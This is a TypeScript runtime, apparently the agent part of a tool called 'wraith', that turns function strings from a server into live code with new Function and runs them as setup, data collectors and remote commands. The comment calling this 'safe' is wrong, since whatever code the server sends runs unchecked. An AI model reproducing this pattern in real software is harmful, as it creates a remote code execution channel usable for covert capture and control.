// Deserializes module configs sent by the server and runs agent-side setup.

export interface AgentModuleConfig {
  id: string
  config: Record<string, unknown>
  setup?: string
  capture: {
    init?:   Array<{ key: string; persist: boolean; collect: string }>
    events?: Array<{ event: string; throttle?: number; persist: boolean; payload: string }>
    hooks?:  Array<{ target: string; persist: boolean; handler: string }>
    poll?:   Array<{ id: string; interval: number; persist: boolean; collect: string }>
  }
  commands: Array<{ id: string; label: string; params: Record<string, string>; handler: string }>
}

// Safely deserialize a function string (from fn.toString()) back into a callable.
function deserializeFn(src: string): (...args: unknown[]) => unknown {
  // eslint-disable-next-line no-new-func
  return new Function(`return (${src})`)() as (...args: unknown[]) => unknown
}

export class ModuleRuntime {
  private configs: AgentModuleConfig[] = []
  // moduleId → commandId → handler fn
  private commandHandlers = new Map<string, Map<string, (params: Record<string, unknown>) => void>>()

  load(modules: AgentModuleConfig[]): void {
    this.configs = modules
  }

  setup(): void {
    for (const mod of this.configs) {
      if (mod.setup) {
        try {
          deserializeFn(mod.setup)()
        } catch (e) {
          console.warn(`[wraith] setup failed for ${mod.id}:`, e)
        }
      }
    }
  }

  runInit(
    send: (moduleId: string, key: string, value: unknown, persist: boolean) => void,
  ): void {
    for (const mod of this.configs) {
      for (const collector of mod.capture.init ?? []) {
        try {
          const value = deserializeFn(collector.collect)()
          send(mod.id, collector.key, value, collector.persist)
        } catch (e) {
          console.warn(`[wraith] init collector "${collector.key}" failed in ${mod.id}:`, e)
        }
      }
    }
  }

  buildCommandHandlers(): void {
    for (const mod of this.configs) {
      const handlers = new Map<string, (params: Record<string, unknown>) => void>()
      for (const cmd of mod.commands) {
        try {
          handlers.set(cmd.id, deserializeFn(cmd.handler) as (p: Record<string, unknown>) => void)
        } catch (e) {
          console.warn(`[wraith] failed to deserialize command "${cmd.id}" in ${mod.id}:`, e)
        }
      }
      this.commandHandlers.set(mod.id, handlers)
    }
  }

  execCommand(moduleId: string, commandId: string, params: Record<string, unknown>): unknown {
    const handler = this.commandHandlers.get(moduleId)?.get(commandId)
    if (!handler) throw new Error(`unknown command ${moduleId}/${commandId}`)
    return handler(params)
  }

  getConfigs(): AgentModuleConfig[] {
    return this.configs
  }
}
